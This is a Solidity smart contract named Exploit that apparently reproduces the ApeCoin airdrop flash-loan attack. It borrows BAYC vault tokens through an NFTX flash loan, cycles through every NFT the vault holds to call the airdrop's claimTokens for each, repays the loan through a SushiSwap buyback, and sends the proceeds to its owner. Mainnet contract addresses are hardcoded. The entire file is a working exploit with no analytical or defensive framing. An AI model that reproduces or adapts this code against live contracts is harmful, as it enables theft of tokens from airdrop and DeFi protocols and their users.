pragma solidity ^0.8.0;

import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import './NFTXVaultUpgradeable/NFTXVaultUpgradeable.sol';
import './NFTXVaultUpgradeable/EnumerableSetUpgradeable.sol';
import './AirdropGrapesToken/AirdropGrapesToken.sol';

contract Exploit is ERC721SafeHolderUpgradeable{
    address public owner;
    uint256 public APEbalance;

    constructor() {
        owner = msg.sender;
    }

    function attack(uint256 amount) public payable {
        require(msg.sender == owner, "o");

        NFTXVaultUpgradeable BAYCVault = NFTXVaultUpgradeable(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
        BAYCVault.flashLoan(IERC3156FlashBorrowerUpgradeable(address(this)), address(BAYCVault), amount, "");

        payable(owner).call{value: address(this).balance}("");
    }

    function onFlashLoan(address from, address, uint256 amount, uint256, bytes memory) public returns (bytes32) {
        require(from == address(this), "w");

        IERC20Upgradeable APE = IERC20Upgradeable(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
        IERC721Upgradeable BAYC = IERC721Upgradeable(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
        NFTXVaultUpgradeable BAYCVault = NFTXVaultUpgradeable(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
        AirdropGrapesToken airdrop = AirdropGrapesToken(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);

        uint256[] memory allHoldings = BAYCVault.allHoldings();

        uint256 randomNFT = BAYCVault.redeem(1, new uint256[](0))[0];
        uint256 nowNFT = randomNFT;

        uint256[] memory tokenIds = new uint256[](1);
        uint256[] memory specificIds = new uint256[](1);

        for(uint i; i < allHoldings.length; i++) {
            airdrop.claimTokens();
            if (randomNFT != allHoldings[i]) {

                BAYC.safeTransferFrom(address(this), address(BAYCVault), nowNFT, "");

                tokenIds[0] = nowNFT;
                specificIds[0] = allHoldings[i];

                nowNFT = BAYCVault.swap(tokenIds, new uint256[](0), specificIds)[0];
            }
        }
        
        // now able to swap APE for ETH, because at that time, there is no enough liquidity in any swap.
        APEbalance = APE.balanceOf(address(this));
        // swapAPEforETH();

        tokenIds[0] = nowNFT;
        BAYC.safeTransferFrom(address(this), address(BAYCVault), nowNFT, "");
        BAYCVault.mint(tokenIds, new uint256[](0));

        buyBack(amount);

        BAYCVault.approve(address(BAYCVault), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function swapAPEforETH() internal {
        IERC20Upgradeable APE = IERC20Upgradeable(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
        IUniswapV2Router02 router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        address[] memory path = new address[](2);
        path[1] = router.WETH();
        path[0] = address(APE);

        router.swapExactTokensForETH(APE.balanceOf(address(this)), 0, path, address(this), block.timestamp);
    }

    function buyBack(uint256 amount) internal {
        IUniswapV2Router02 router = IUniswapV2Router02(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
        NFTXVaultUpgradeable BAYCVault = NFTXVaultUpgradeable(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);

        uint shouldBuy = amount - BAYCVault.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(BAYCVault);
        
        router.swapETHForExactTokens{value: address(this).balance}(shouldBuy, path, address(this), block.timestamp);
    }

    fallback() external payable {}

}
